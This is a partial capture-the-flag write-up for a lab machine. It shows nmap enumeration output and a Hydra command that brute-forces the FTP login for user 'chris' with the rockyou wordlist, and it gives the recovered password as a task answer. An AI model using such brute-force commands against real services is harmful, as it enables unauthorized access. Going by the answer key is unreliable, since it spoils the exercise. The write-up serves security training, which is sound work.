You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.


### TASk 1 : Enumerate

Enumerate the machine and get all the important information

**NMAP**

`
ashik@whitedevil:~$ nmap -sV -A -vv 10.10.188.185  
Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-14 11:06 IST  
NSE: Loaded 151 scripts for scanning.  
NSE: Script Pre-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 11:06  
Completed NSE at 11:06, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 11:06  
Completed NSE at 11:06, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 11:06  
Completed NSE at 11:06, 0.00s elapsed  
Initiating Ping Scan at 11:06  
Scanning 10.10.188.185 \[2 ports\]  
Completed Ping Scan at 11:06, 0.41s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 11:06  
Completed Parallel DNS resolution of 1 host. at 11:06, 0.01s elapsed  
Initiating Connect Scan at 11:06  
Scanning 10.10.188.185 \[1000 ports\]  
Discovered open port 21/tcp on 10.10.188.185  
Discovered open port 22/tcp on 10.10.188.185  
Discovered open port 80/tcp on 10.10.188.185  
Increasing send delay for 10.10.188.185 from 0 to 5 due to max\_successful\_tryno increase to 4  
Increasing send delay for 10.10.188.185 from 5 to 10 due to max\_successful\_tryno increase to 5  
Completed Connect Scan at 11:07, 50.99s elapsed (1000 total ports)  
Initiating Service scan at 11:07  
Scanning 3 services on 10.10.188.185  
Completed Service scan at 11:07, 6.85s elapsed (3 services on 1 host)  
NSE: Script scanning 10.10.188.185.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 11.03s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 1.66s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 0.00s elapsed  
Nmap scan report for 10.10.188.185  
Host is up, received syn-ack (0.36s latency).  
Scanned at 2021-06-14 11:06:21 IST for 71s  
Not shown: 995 closed ports  
Reason: 995 conn-refused  
PORT      STATE    SERVICE     REASON      VERSION  
21/tcp    open     ftp         syn-ack     vsftpd 3.0.3  
22/tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKK  
jKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFx  
tMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r  
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5j  
qnAQa0ihI6IDtQUimgvooZCLNl6ob68=  
|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)  
|\_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt  
80/tcp    open     http        syn-ack     Apache httpd 2.4.29 ((Ubuntu))  
| http-methods:    
|\_  Supported Methods: GET HEAD POST OPTIONS  
|\_http-server-header: Apache/2.4.29 (Ubuntu)  
|\_http-title: Annoucement  
1272/tcp  filtered cspmlockmgr no-response  
27353/tcp filtered unknown     no-response  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel  
  
NSE: Script Post-scanning.  
NSE: Starting runlevel 1 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 0.00s elapsed  
NSE: Starting runlevel 2 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 0.00s elapsed  
NSE: Starting runlevel 3 (of 3) scan.  
Initiating NSE at 11:07  
Completed NSE at 11:07, 0.00s elapsed  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 71.49 seconds
`


**HYDRA**

`
ashik@whitedevil:~$ hydra -t 4 -l chris -P rockyou.txt ftp://10.10.188.185  
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-14 11:42:04  
\[DATA\] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task  
\[DATA\] attacking ftp://10.10.188.185:21/  
\[STATUS\] 56.00 tries/min, 56 tries in 00:01h, 14344342 to do in 4269:09h, 4 active  
\[STATUS\] 57.00 tries/min, 171 tries in 00:03h, 14344227 to do in 4194:14h, 4 active  
\[21\]\[ftp\] host: 10.10.188.185 login: chris password: crystal
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-14 11:46:28
`

1. FTP password

*ANSWER:* crystal

2. Zip file password

3. steg password
